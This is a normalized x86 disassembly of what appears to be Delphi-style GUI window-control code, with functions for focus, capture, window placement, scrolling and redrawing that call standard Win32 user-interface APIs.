mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a394
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44c6fc
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403324
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43a394
test al al
jne r-xdata
sub_43a3f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a394
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a418
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4380c0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_438084
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_435d5c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43a418
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_43a4c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_43a418
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_44c6fc
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_435d5c
test eax eax
jne r-xdata
sub_43a570
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_439010
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a590
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_439010
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a5c4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_439010
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a5e4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_43a634
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_43a658
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_433e80
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4380c0
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_438084
mov dl [ esp ]
mov si 0xffd1
call sub_403324
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_43a6b0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403324
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_43a6d4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403324
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_43a70c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_436830
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_438120
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_438930
sub_43a744
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403324
pop esi
pop ebx
retn
mov eax ebx
call sub_4351ec
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_404338
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_404338
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_43a7c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_438d10
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_436904
sub_43a824
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_438a84
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_437e80
pop ebx
retn
sub_43a854
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_43a87c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_43b694
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_437e80
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_43a8ec
push ebx
mov ebx eax
mov eax ebx
call sub_436770
mov eax ebx
call sub_43b694
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_438120
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_41c570
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_435d5c
sub_43a928
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_433460
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_43b390
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_435d5c
sub_43a968
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43b694
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_43b390
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43a9a8
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_438120
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_43b694
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_43b298
sub_43a9e8
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_43b4d0
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_43b4d0
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_43aa48
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_4357b8
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_4346f8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_438c7c
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_43aab8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4368a8
mov edx esi
mov eax ebx
call sub_4380e0
pop esi
pop ebx
retn
sub_43aad4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_431a9c
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_44c6fc
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403324
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403324
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403324
test al al
jne r-xdata
sub_43ab68
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43c4b8
mov edx esi
mov eax ebx
call sub_43aad4
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_435d5c
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_435d5c
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_435d5c
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44c6fc
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_435d5c
test eax eax
jne r-xdata
jmp r-xdata
sub_43ac4c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_435d5c
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_43aca0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_435d5c
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44c6fc
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_435d5c
test eax eax
jne r-xdata
sub_43acec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_43aad4
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_435d5c
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44c6fc
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_435d5c
test eax eax
jne r-xdata
sub_43ad48
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44c6fc
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_435d5c
mov [ esi + 0xc ] eax
sub_43ad7c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_43b694
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43b694
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_434208
mov eax ebx
mov si 0xffd0
call sub_403324
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_434554
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43ae54
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_4380c0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_438084
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403324
inc edi
dec ebx
jne r-xdata
sub_43ae9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_437c28
xor eax eax
push ebp
push sub_43af3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43ae54
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4347d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43af41
mov eax [ ebp - 0x4 ]
call sub_437c30
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call sub_405fa4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call sub_405fa4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_43af48
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_4380c0
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_437c50
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_438084
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_43b038
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_413914
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_4137a8
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_413934
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_4138b8
call sub_43b390
jmp r-xdata
mov eax ebp
mov edx esi
call sub_4138b8
call sub_43b390
sub_43b110
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_43b038
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_43b170
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_43b390
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_43b390
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
test eax eax
jne r-xdata
sub_43b1d4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b694
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_435d5c
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_42c460
call sub_42c540
test al al
je r-xdata
mov eax ebx
call sub_4380c0
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_438084
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_438084
test [ eax + 0x52 ] 0x4
je r-xdata
sub_43b298
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_434554
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_43b2d0
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_44c6fc
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_43b310
push ebx
mov ebx eax
mov eax ebx
call sub_44c6fc
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_450560
pop ebx
retn
mov eax ebx
call sub_44c724
mov eax ebx
call sub_43b390
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_43b348
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43b36c
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_43b36c
sub_43b3a4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_412484
mov eax edi
call sub_4380c0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_438084
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_43b438
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_43b390
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_43b470
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43b694
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43b390
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403324
sub_43b52c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_413914
pop esi
pop ebx
retn
sub_43b550
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b52c
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_4137a8
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_413934
sub_43b5c4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_43b694
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_435d5c
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_43b624
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_43b688
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
